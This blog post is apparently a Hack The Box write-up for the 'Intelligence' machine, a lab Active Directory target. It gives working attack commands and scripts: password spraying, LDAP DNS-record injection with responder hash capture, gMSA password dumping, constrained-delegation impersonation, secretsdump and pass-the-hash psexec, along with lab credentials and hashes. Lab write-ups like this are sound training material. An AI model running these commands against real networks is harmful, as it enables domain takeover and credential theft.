---
title: Intelligence
tags: 
    - LDAP Injection
    - Read GMS Password
    - Constrainder Delegation
    - Active Directory
    - "Medium Machines"
category:
    - "Hack The Box Writeup"
date: 2022-01-13
description: "Hack The Box Machine - Intelligence writeup"
author: "Tejas"
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: true
disableHLJS: false 
disableHLJS: false
hideSummary: true
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "https://pbs.twimg.com/media/E5DjupxXwAMen3E?format=jpg&name=4096x4096" # image path/url
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Enumeration

### Open Port

```Bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-08-06 12:35:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default

<STRIPED>
```

## Web Enumeration

{{< figure src="images/1.png">}}

As we try to dowload the document we notice that file names are in date-stamps! Let's find out all the valid file names using feroxbuster.
And then we can download them. I automated this process... 

### Create Date Stamp Wordlist

I used [BruteSploit](https://github.com/Screetsec/BruteSploit/blob/master/tools/datelist) from github! To generate a wordlist from `2019 to 2021`

`./wordlist-gen.sh -b 2019-01-01 -e 2021-12-31 -f yyyymmdd -s - -o wordlist.txt -a "-upload.pdf"`

I used the above command to generate the wordlist

### FeroxBuster

{{< figure src="images/2.png">}}

### Dumper And Extractor

I created a small py scripts to dump (dowload) those PDFs, and then extractor to get useful info like password?

```Python
# dumper.py

#!/usr/bin/env python3
import requests


x = ["http://intelligence.htb/documents/2020-01-02-upload.pdf"]

# Above is a representation of what it had. You will have to put the feroxbuster's urls into a list here.


for url in x:
    r = requests.get(url, allow_redirects=True)
    with open(f"""{url.split('/')[-1]}""", 'wb') as f:
        f.write(r.content)
```

```Python
# extractor.py
#!/usr/bin/env python3
import PyPDF2 as x
names = ["2020-01-01-upload.pdf"]

# Above is a representation of what it had. You will have to put the downloaded file's file names.

for i in names:
    fileobject = open(i,'rb')
    pdfreader =  x.PdfFileReader(fileobject)
    pageobj = pdfreader.getPage(0)
    if pageobj.extractText().find("password")!=-1: 
        print(pageobj.extractText())
        print(i)

```

### PDF File Enumeration

I got the default password from the PDF file 
 
{{< figure src="images/3.png">}}

2020-06-04-upload.pdf
 
 ```Md
 New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```


I made a users wordlist from exif of the pdf

`exiftool * | grep Creator > users`

## FootHold

### Finding correct Credentials

I ran the following command
`crackmapexec smb intelligence.htb -u users -p "NewIntelligenceCorpUser9876" `

{{< figure src="images/4.png">}}

I got the above as the credentials 
`intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876`

{{< figure src="images/5.png">}}


Now let's See whats in `Users` Shares

{{< figure src="images/6.png">}}

Inside `Tiffany.Molina` folder in Desktop we find `user.txt`. **Got our flag!**


## Privilege Escalation

### Injecting DNS Record Using LDAP

As we read the `downdetector.ps1` it checks with default creds if the site is alive/dead.

```Ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
		
So we shall inject out ip as a dns record using ldap.
I used [dnstoo.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)

and then I set up  `responder` to get the hash

`./dnstool.py -u "10.10.10.248\Tiffany.Molina" -p "NewIntelligenceCorpUser9876" 10.10.10.248  -a add  -d 10.10.14.24 -r web.intelligence.htb `


{{< figure src="images/7.png">}}

And the hash

{{< figure src="images/8.png">}}

CRACKED!

{{< figure src="images/9.png">}}

CREDENTIALS: `TED.GRAVES:Mr.Teddy`

---

### Read GMSA Password

`python3 gMSADumper.py -u "TED.GRAVES" -p "Mr.Teddy" -d intelligence.htb`

{{< figure src="images/10.png">}}

`svc_int$:::5e47bac787e5e1970cf9acdb5b316239`

Now we have the hash of `svc_int$`

### Constrained Delegation Exploitation

Following this [article](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)

{{< figure src="images/11.png">}}



`impacket-GetUserSPNs "intelligence.htb/svc_int$" -request-user UNCONSTRAINED_USER -hashes :5e47bac787e5e1970cf9acdb5b316239`
{{< figure src="images/12.png">}}

That step was done to check if it had *unconstrained delegation!*

### Constrained Delegation User Impersonation

`impacket-getST -spn www/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$ -hashes :5e47bac787e5e1970c
f9acdb5b316239`

The above command makes an cache of the ticket similar to the article

{{< figure src="images/13.png">}}


And then I import the kerberos TGT ticket

Finally I ll use `secretsdump.py` 

{{< figure src="images/14.png">}}

<br>

{{< figure src="images/15.png">}}


Got administrator hash
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::`




We will use `Administrator` hash with `psexec`
`impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3 administrator@10.10.10.248`

{{< figure src="images/16.png">}}

<br>

{{< figure src="images/17.png">}}

